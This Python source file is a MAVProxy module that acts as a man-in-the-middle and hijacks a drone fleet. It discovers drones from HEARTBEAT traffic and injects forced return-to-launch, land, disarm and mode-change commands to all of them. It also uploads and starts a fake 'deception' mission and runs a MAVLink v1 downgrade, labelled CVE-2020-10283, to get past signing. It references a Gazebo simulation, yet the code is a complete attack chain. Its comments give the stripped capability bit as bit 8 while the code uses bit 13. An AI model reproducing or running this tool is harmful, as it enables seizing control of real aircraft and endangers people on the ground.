"""
mavproxy_hijack.py — MAVProxy MITM Fleet Hijack Module
=======================================================
Hooks into MAVProxy's packet processing pipeline.
Passively discovers all drone sysids from HEARTBEAT traffic in transit.
On command, injects attack packets toward the entire discovered fleet.

NO prior assumptions:
  - Drone sysids discovered dynamically from HEARTBEAT packets
  - Fleet size unknown a priori
  - Works regardless of MAVLink signing (signed packets forwarded intact)

Commands (in MAVProxy console):
  hijack status     — show discovered drones
  hijack downgrade  — CVE-2020-10283: force MAVLink v1 downgrade on all drones
                      Bypasses signing by removing MAV_PROTOCOL_CAPABILITY_MAVLINK2
                      from AUTOPILOT_VERSION responses. After downgrade, all
                      injection attacks work because v1 has no authentication.
  hijack rtl        — force RTL on all drones
  hijack land       — force LAND on all drones
  hijack disarm     — disarm all drones
  hijack mode HOLD  — set flight mode
  hijack mission    — inject fake circular mission
  hijack start      — downgrade + RTL + Mission Deception (full attack chain)
"""

import time
import math
import threading
from pymavlink import mavutil
from MAVProxy.modules.lib import mp_module

GCS_SYSID  = 255
GCS_COMPID = 190

MAV_CMD_NAV_RETURN_TO_LAUNCH = 20
MAV_CMD_NAV_TAKEOFF          = 22
MAV_CMD_NAV_LAND             = 21
MAV_CMD_NAV_WAYPOINT         = 16
MAV_CMD_DO_SET_MODE          = 176
MAV_CMD_COMPONENT_ARM_DISARM = 400
MAV_CMD_MISSION_START        = 300

PX4_MODES = {
    "MANUAL": 1, "TAKEOFF": 2, "MISSION": 3,
    "HOLD":   4, "RTL":     5, "LAND":    6,
}

HOME_LAT  = 47.397742
HOME_LON  = 8.545594
WP_RADIUS = 0.0015
WP_ALT    = 25.0

# MAVLink capability flags (from mavlink common.xml)
# Used for CVE-2020-10283 downgrade attack
MAV_PROTOCOL_CAPABILITY_MAVLINK2     = 8192        # bit 13, value 0x2000 — MAVLink v2 support
MAV_PROTOCOL_CAPABILITY_MISSION_FLOAT = (1 << 0)
MAV_PROTOCOL_CAPABILITY_MISSION_INT   = (1 << 6)

# AUTOPILOT_VERSION message ID
MSGID_AUTOPILOT_VERSION = 148
MSGID_COMMAND_LONG      = 76
MAV_CMD_REQUEST_AUTOPILOT_CAPABILITIES = 520


class HijackModule(mp_module.MPModule):

    def __init__(self, mpstate):
        super(HijackModule, self).__init__(
            mpstate, "hijack", "Fleet hijack MITM module")

        self.drones          = {}    # {sysid: {sysid, compid, last_seen, armed}}
        self.lock            = threading.Lock()
        self.downgrade_active = False  # True after CVE-2020-10283 attack started
        self.downgraded      = set()  # sysids that have been downgraded to v1

        self.add_command('hijack', self.cmd_hijack,
                         "Fleet hijack MITM module",
                         ['status','downgrade','rtl','land','disarm',
                          'mode <MODE>','mission','start','debug'])

        print("\n[HIJACK] *** Module loaded ***")
        print("[HIJACK] Listening for drone HEARTBEATs passively...")
        print("[HIJACK] Commands: hijack status | rtl | land | "
              "disarm | mode <MODE> | mission | start\n")

    def mavlink_packet(self, m):
        """
        Called for every MAVLink packet in transit.
        Handles:
          1. HEARTBEAT — passive drone discovery
          2. AUTOPILOT_VERSION — CVE-2020-10283 downgrade interception
        """
        self._sync_from_mavproxy()

        msg_type = m.get_type()
        sysid    = m.get_srcSystem()
        compid   = m.get_srcComponent()

        # ── CVE-2020-10283: Intercept AUTOPILOT_VERSION ──────────────
        # AUTOPILOT_VERSION is sent by the DRONE in response to
        # QGC's REQUEST_AUTOPILOT_CAPABILITIES command.
        # It contains a 'capabilities' bitmask. Bit 8 = MAVLink v2 support.
        # We strip that bit — drone thinks QGC cannot do v2 → downgrades to v1.
        if msg_type == 'AUTOPILOT_VERSION' and self.downgrade_active:
            if sysid not in (0, GCS_SYSID):
                self._intercept_autopilot_version(m, sysid, compid)
                return  # Drop original — we will resend modified version

        # ── HEARTBEAT — passive discovery ────────────────────────────
        if msg_type != 'HEARTBEAT':
            return
        if sysid == GCS_SYSID or sysid == 0:
            return
        self._register_drone(sysid, compid,
                             bool(getattr(m, 'base_mode', 0) & 0x80))

        # Check if drone has confirmed v1 downgrade
        if sysid in self.downgraded:
            # HEARTBEAT STX check — v1 uses 0xFE, v2 uses 0xFD
            raw = getattr(m, '_msgbuf', None)
            if raw and len(raw) > 0:
                stx = raw[0] if isinstance(raw[0], int) else ord(raw[0])
                if stx == 0xFE:
                    print(f"\n[HIJACK] ✓ CONFIRMED: sysid={sysid} "
                          f"sending MAVLink v1 (STX=0xFE) — signing bypassed!")

    def _intercept_autopilot_version(self, m, sysid, compid):
        """
        CVE-2020-10283 — MAVLink Version Downgrade Attack.

        Intercepts AUTOPILOT_VERSION from drone, strips the
        MAV_PROTOCOL_CAPABILITY_MAVLINK2 bit (bit 8) from capabilities,
        then re-sends the modified message toward QGC.

        QGC receives a version announcement saying the drone does NOT
        support MAVLink v2. QGC then falls back to v1 on that channel.
        The drone follows suit — both sides switch to MAVLink v1.
        MAVLink v1 has NO signing → all our injection attacks work.

        AUTOPILOT_VERSION payload structure (wire order):
          uint64 capabilities   ← we zero bit 8 here
          uint64 uid
          uint32 flight_sw_version
          uint32 middleware_sw_version
          uint32 os_sw_version
          uint32 board_version
          uint16 vendor_id
          uint16 product_id
          uint8[8] flight_custom_version
          uint8[8] middleware_custom_version
          uint8[8] os_custom_version
        """
        import struct

        try:
            # Get original capabilities
            orig_caps = getattr(m, 'capabilities', 0)

            # Strip MAVLink v2 capability bit (0x2000 = bit 13 = 8192)
            new_caps = orig_caps & ~MAV_PROTOCOL_CAPABILITY_MAVLINK2

            print(f"\n[HIJACK] CVE-2020-10283 — Intercepting AUTOPILOT_VERSION")
            print(f"  From sysid={sysid}")
            print(f"  Original capabilities : 0x{orig_caps:016X}")
            print(f"  Modified capabilities : 0x{new_caps:016X}")
            print(f"  MAVLink2 bit stripped : "
                  f"{'YES ← v1 downgrade forced' if orig_caps != new_caps else 'bit was already 0'}")

            # Build modified AUTOPILOT_VERSION payload
            # Wire format: capabilities(8) + uid(8) + flight_sw(4) +
            #              middleware_sw(4) + os_sw(4) + board(4) +
            #              vendor_id(2) + product_id(2) +
            #              flight_custom(8) + middleware_custom(8) + os_custom(8)
            uid               = getattr(m, 'uid', 0)
            flight_sw         = getattr(m, 'flight_sw_version', 0)
            middleware_sw     = getattr(m, 'middleware_sw_version', 0)
            os_sw             = getattr(m, 'os_sw_version', 0)
            board             = getattr(m, 'board_version', 0)
            vendor_id         = getattr(m, 'vendor_id', 0)
            product_id        = getattr(m, 'product_id', 0)
            flight_custom     = bytes(getattr(m, 'flight_custom_version', [0]*8))[:8]
            middleware_custom = bytes(getattr(m, 'middleware_custom_version', [0]*8))[:8]
            os_custom         = bytes(getattr(m, 'os_custom_version', [0]*8))[:8]

            payload = struct.pack('<QQ', new_caps, uid)
            payload += struct.pack('<IIII', flight_sw, middleware_sw, os_sw, board)
            payload += struct.pack('<HH', vendor_id, product_id)
            payload += flight_custom.ljust(8, b'\x00')
            payload += middleware_custom.ljust(8, b'\x00')
            payload += os_custom.ljust(8, b'\x00')

            # CRC extra for AUTOPILOT_VERSION (msgid=148)
            CRC_EXTRA_AUTOPILOT_VERSION = 178

            def crc16(data, seed):
                crc = 0xFFFF
                for b in data:
                    tmp = b ^ (crc & 0xFF)
                    tmp = (tmp ^ (tmp << 4)) & 0xFF
                    crc = ((crc >> 8) ^ (tmp << 8) ^ (tmp << 3) ^ (tmp >> 4)) & 0xFFFF
                tmp = seed ^ (crc & 0xFF)
                tmp = (tmp ^ (tmp << 4)) & 0xFF
                crc = ((crc >> 8) ^ (tmp << 8) ^ (tmp << 3) ^ (tmp >> 4)) & 0xFFFF
                return crc

            seq    = getattr(m, '_header', None)
            seq_n  = getattr(seq, 'seq', 0) if seq else 0
            msgid  = 148
            msgid_b = msgid.to_bytes(3, 'little')
            hdr = bytes([0xFD, len(payload), 0, 0, seq_n,
                         sysid, compid]) + msgid_b
            crc_val = crc16(hdr[1:] + payload, CRC_EXTRA_AUTOPILOT_VERSION)
            pkt = hdr + payload + struct.pack('<H', crc_val)

            # Send modified packet toward QGC via master output
            # MAVProxy will forward this to QGC instead of the original
            self.master.write(pkt)

            # Mark this drone as targeted for downgrade
            self.downgraded.add(sysid)
            print(f"  Modified AUTOPILOT_VERSION sent to QGC")
            print(f"  QGC should now downgrade channel to MAVLink v1")
            print(f"  Watch for: sysid={sysid} HEARTBEAT with STX=0xFE\n")

        except Exception as e:
            print(f"[HIJACK] Downgrade interception error: {e}")
            import traceback
            traceback.print_exc()

    def _cmd_downgrade(self):
        """
        CVE-2020-10283 — MAVLink Version Downgrade Attack.

        Step 1: Enable interception of AUTOPILOT_VERSION messages.
        Step 2: Trigger QGC to re-request capabilities from all drones.
                QGC sends REQUEST_AUTOPILOT_CAPABILITIES (cmd 520) periodically,
                or we can force it by sending the request ourselves.

        Once AUTOPILOT_VERSION is intercepted and modified, the channel
        downgrades to MAVLink v1 — signing is bypassed automatically.
        After downgrade, use 'hijack rtl' or 'hijack mission' normally.
        """
        print(f"\n{'='*65}")
        print(f"  [DOWNGRADE] CVE-2020-10283 — MAVLink v1 Downgrade Attack")
        print(f"  Stripping MAV_PROTOCOL_CAPABILITY_MAVLINK2 from")
        print(f"  AUTOPILOT_VERSION responses — forces v1 fallback")
        print(f"{'='*65}\n")

        # Enable interception
        self.downgrade_active = True
        print(f"[HIJACK] Interception ENABLED — waiting for AUTOPILOT_VERSION...")

        # Force capability re-request on all discovered drones
        # by sending REQUEST_AUTOPILOT_CAPABILITIES from GCS sysid
        with self.lock:
            targets = dict(self.drones)

        if not targets:
            print("[HIJACK] No drones discovered yet. "
                  "Will intercept when AUTOPILOT_VERSION arrives.")
            print("[HIJACK] Tip: type 'hijack status' in 10s to check discovery.")
            return

        # Build link map
        link_masters = {}
        try:
            for i, master in enumerate(self.mpstate.mav_master):
                link_masters[i] = master
        except Exception:
            pass

        sysid_to_link = {}
        try:
            for lnum, vset in self.mpstate.vehicle_link_map.items():
                for (sid, cid) in vset:
                    sysid_to_link[sid] = lnum
        except Exception:
            pass

        print(f"[HIJACK] Forcing capability re-request on "
              f"{len(targets)} drone(s)...")

        for sysid, drone in sorted(targets.items()):
            lnum   = sysid_to_link.get(sysid)
            master = link_masters.get(lnum, self.master) if lnum is not None                      else self.master
            print(f"  → Requesting capabilities from sysid={sysid}")
            # Send MAV_CMD_REQUEST_AUTOPILOT_CAPABILITIES (520)
            try:
                master.mav.command_long_send(
                    sysid, drone["compid"],
                    MAV_CMD_REQUEST_AUTOPILOT_CAPABILITIES, 0,
                    1.0, 0, 0, 0, 0, 0, 0)
            except Exception as e:
                print(f"    [!] Error: {e}")
            import time
            time.sleep(0.2)

        print(f"\n[HIJACK] Downgrade attack running.")
        print(f"[HIJACK] Watch for 'CVE-2020-10283' messages as drones respond.")
        print(f"[HIJACK] After downgrade confirmed → run 'hijack rtl' or 'hijack mission'")

    def _register_drone(self, sysid, compid, armed=False):
        """Registers a drone by sysid — called from both hooks."""
        # Exclude MAVProxy itself (254) and GCS (255)
        if sysid in (0, 254, 255):
            return
        with self.lock:
            if sysid not in self.drones:
                self.drones[sysid] = {
                    "sysid":     sysid,
                    "compid":    compid if compid else 1,
                    "last_seen": time.time(),
                    "armed":     armed,
                }
                print(f"\n[HIJACK] *** NEW DRONE DISCOVERED: sysid={sysid} ***")
                print(f"[HIJACK] Total fleet: {len(self.drones)} drone(s)\n")
            else:
                self.drones[sysid]["last_seen"] = time.time()
                self.drones[sysid]["armed"]     = armed

    def _sync_from_mavproxy(self):
        """
        Reads MAVProxy's vehicle_link_map to discover all drones.
        vehicle_link_map = {link_num: {(sysid, compid), ...}, ...}
        This is the definitive source — populated by MAVProxy itself
        when it prints "Detected vehicle X:Y on link Z".
        """
        EXCLUDE = {0, 254, 255}
        try:
            vlm = self.mpstate.vehicle_link_map
            for link_num, vehicle_set in vlm.items():
                for (sysid, compid) in vehicle_set:
                    if sysid not in EXCLUDE:
                        self._register_drone(sysid, compid)
        except Exception:
            pass


    def idle_task(self):
        """
        Called periodically by MAVProxy even without incoming packets.
        Used to continuously sync drone discovery from all links.
        """
        self._sync_from_mavproxy()

    def cmd_hijack(self, args):
        if not args:
            print("Usage: hijack <status|rtl|land|disarm|mode|mission|start>")
            return
        cmd = args[0].lower()
        if cmd == "status":      self._status()
        elif cmd == "downgrade": self._cmd_downgrade()
        elif cmd == "rtl":       self._rtl()
        elif cmd == "land":      self._land()
        elif cmd == "disarm":    self._disarm()
        elif cmd == "mode":
            self._mode(args[1].upper() if len(args) > 1 else "RTL")
        elif cmd == "mission":   self._mission()
        elif cmd == "start":     self._start()
        elif cmd == "debug":     self._debug()
        else: print(f"[HIJACK] Unknown: {cmd}")

    def _status(self):
        with self.lock:
            if not self.drones:
                print("[HIJACK] No drones yet. Waiting for HEARTBEATs...")
                return
            print(f"\n[HIJACK] Discovered drones ({len(self.drones)}):")
            for sid, d in sorted(self.drones.items()):
                age   = time.time() - d["last_seen"]
                armed = "ARMED" if d["armed"] else "disarmed"
                print(f"  sysid={sid} [{armed}] last_seen={age:.1f}s ago")
            print()

    def _send_all(self, command, p1=0.,p2=0.,p3=0.,
                  p4=0.,p5=0.,p6=0.,p7=0., confirms=3):
        """
        Sends COMMAND_LONG to every discovered drone.
        Uses vehicle_link_map to find the correct link per drone,
        then sends on that specific link.
        """
        with self.lock:
            targets = dict(self.drones)
        if not targets:
            print("[HIJACK] No drones discovered yet.")
            return
        print(f"[HIJACK] Sending cmd={command} to {len(targets)} drone(s)...")

        # Build link_num -> master mapping
        link_masters = {}
        try:
            for i, master in enumerate(self.mpstate.mav_master):
                link_masters[i] = master
        except Exception:
            pass

        # Build sysid -> link_num mapping from vehicle_link_map
        sysid_to_link = {}
        try:
            for link_num, vehicle_set in self.mpstate.vehicle_link_map.items():
                for (sysid, compid) in vehicle_set:
                    sysid_to_link[sysid] = link_num
        except Exception:
            pass

        print(f"[HIJACK] Link map: {sysid_to_link}")

        for sysid, d in sorted(targets.items()):
            link_num = sysid_to_link.get(sysid)
            master   = link_masters.get(link_num, self.master) if link_num is not None else self.master
            print(f"  → sysid={sysid} via link={link_num}")
            for c in range(confirms):
                try:
                    master.mav.command_long_send(
                        sysid, d["compid"], command, c,
                        p1,p2,p3,p4,p5,p6,p7)
                except Exception as e:
                    print(f"    [!] Send error: {e}")
                time.sleep(0.05)
            time.sleep(0.1)


    def _rtl(self):
        print("\n[HIJACK] ATTACK: FLEET RTL!")
        self._send_all(MAV_CMD_NAV_RETURN_TO_LAUNCH)
        print("[HIJACK] RTL sent! Watch QGC and Gazebo.")

    def _land(self):
        print("\n[HIJACK] ATTACK: FORCED LAND!")
        self._send_all(MAV_CMD_NAV_LAND)
        print("[HIJACK] LAND sent.")

    def _disarm(self):
        print("\n[HIJACK] ATTACK: DISARM ALL!")
        self._send_all(MAV_CMD_COMPONENT_ARM_DISARM, p1=0.0)
        print("[HIJACK] DISARM sent.")

    def _mode(self, mode):
        cm = PX4_MODES.get(mode, 4)
        print(f"\n[HIJACK] ATTACK: SET_MODE → {mode}")
        self._send_all(MAV_CMD_DO_SET_MODE, p1=1.0, p2=float(cm))
        print(f"[HIJACK] MODE {mode} sent.")

    def _mission(self):
        with self.lock:
            targets = dict(self.drones)
        if not targets:
            print("[HIJACK] No drones discovered.")
            return
        print(f"\n[HIJACK] ATTACK: MISSION DECEPTION on {len(targets)} drone(s)")
        t = threading.Thread(target=self._upload_all, args=(targets,), daemon=True)
        t.start()

    def _upload_all(self, targets):
        # Build fake circular route
        wps = [(HOME_LAT, HOME_LON, 0.0)]
        for i in range(6):
            a = i * (2 * math.pi / 6)
            wps.append((HOME_LAT + WP_RADIUS * math.cos(a),
                        HOME_LON + WP_RADIUS * math.sin(a), WP_ALT))

        print(f"[HIJACK] Fake route: {len(wps)} waypoints, "
              f"radius=~{WP_RADIUS*111000:.0f}m, alt={WP_ALT}m")

        # Build link map using vehicle_link_map (definitive source)
        link_masters = {}
        try:
            for i, master in enumerate(self.mpstate.mav_master):
                link_masters[i] = master
        except Exception:
            pass

        sysid_to_link = {}
        try:
            for link_num, vehicle_set in self.mpstate.vehicle_link_map.items():
                for (sysid, compid) in vehicle_set:
                    sysid_to_link[sysid] = link_num
        except Exception:
            pass

        # Build final sysid -> master map
        link_map = {}
        for sysid, link_num in sysid_to_link.items():
            if link_num in link_masters:
                link_map[sysid] = link_masters[link_num]

        successful = []
        for sysid, drone in sorted(targets.items()):
            print(f"\n[HIJACK] Uploading to sysid={sysid}...")
            try:
                # Use the specific link for this drone
                conn = link_map.get(sysid, self.master)

                # MISSION_CLEAR_ALL
                conn.mav.mission_clear_all_send(sysid, drone["compid"])
                time.sleep(0.5)

                # MISSION_COUNT
                conn.mav.mission_count_send(sysid, drone["compid"], len(wps), 0)

                # Waypoint handshake
                sent = set()
                ok   = False
                dl   = time.time() + 12.0

                while time.time() < dl:
                    try:
                        msg = conn.recv_match(
                            type=['MISSION_REQUEST_INT','MISSION_ACK'],
                            blocking=True, timeout=2.0)
                    except Exception:
                        msg = None
                    if not msg:
                        continue

                    if msg.get_type() == 'MISSION_REQUEST_INT':
                        wp = msg.seq
                        if wp < len(wps) and wp not in sent:
                            la, lo, al = wps[wp]
                            conn.mav.mission_item_int_send(
                                sysid, drone["compid"],
                                wp, 3, MAV_CMD_NAV_WAYPOINT,
                                1 if wp==1 else 0, 1,
                                0.,0.,0.,float('nan'),
                                int(la*1e7), int(lo*1e7), al, 0)
                            sent.add(wp)
                            print(f"  → WP[{wp}] sent to sysid={sysid}")
                    elif msg.get_type() == 'MISSION_ACK':
                        ok = msg.type == 0
                        status = "ACCEPTED ✓" if ok else f"ERROR({msg.type})"
                        print(f"  ← MISSION_ACK: {status}")
                        break

                if ok:
                    conn.mav.command_long_send(
                        sysid, drone["compid"],
                        MAV_CMD_COMPONENT_ARM_DISARM, 0,
                        1.0,0,0,0,0,0,0)
                    time.sleep(1.0)
                    conn.mav.command_long_send(
                        sysid, drone["compid"],
                        MAV_CMD_MISSION_START, 0,
                        0.0, float(len(wps)-1), 0,0,0,0,0)
                    successful.append(sysid)
                    print(f"[HIJACK] sysid={sysid} executing fake mission!")
                else:
                    print(f"[HIJACK] Upload failed/timeout sysid={sysid}")

            except Exception as e:
                print(f"[HIJACK] Error sysid={sysid}: {e}")

        print(f"\n[HIJACK] Mission Deception done. Success: {successful}")
        print(f"[HIJACK] Watch Gazebo — fake circular route!")

    def _debug(self):
        """Dumps MAVProxy internal state to help diagnose drone discovery."""
        print("\n[HIJACK DEBUG] MAVProxy internal state:")
        try:
            for i, master in enumerate(self.mpstate.mav_master):
                print(f"  Link {i}:")
                for attr in dir(master):
                    if attr.startswith('_'):
                        continue
                    try:
                        val = getattr(master, attr)
                        if isinstance(val, (int, str, float)):
                            print(f"    {attr} = {val}")
                    except Exception:
                        pass
        except Exception as e:
            print(f"  Error: {e}")

        print("\n  mpstate attributes with int values:")
        try:
            for attr in dir(self.mpstate):
                if attr.startswith('_'):
                    continue
                try:
                    val = getattr(self.mpstate, attr)
                    if isinstance(val, (int, str)):
                        print(f"    {attr} = {val}")
                    elif isinstance(val, dict) and len(val) < 10:
                        print(f"    {attr} = {val}")
                except Exception:
                    pass
        except Exception as e:
            print(f"  Error: {e}")
        print()

    def _start(self):
        """
        Full attack chain:
        1. CVE-2020-10283 downgrade (bypass signing)
        2. Wait for downgrade to complete
        3. RTL on all drones
        4. Mission Deception on all drones
        """
        print("\n[HIJACK] FULL ATTACK CHAIN:")
        print("  Step 1: CVE-2020-10283 downgrade (bypass signing)")
        print("  Step 2: RTL fleet")
        print("  Step 3: Mission Deception\n")

        self._cmd_downgrade()
        print("[HIJACK] Waiting 10s for downgrade to complete...")
        time.sleep(10)
        print("[HIJACK] Proceeding with fleet RTL...")
        self._rtl()
        time.sleep(5)
        print("[HIJACK] Proceeding with Mission Deception...")
        self._mission()


def init(mpstate):
    return HijackModule(mpstate)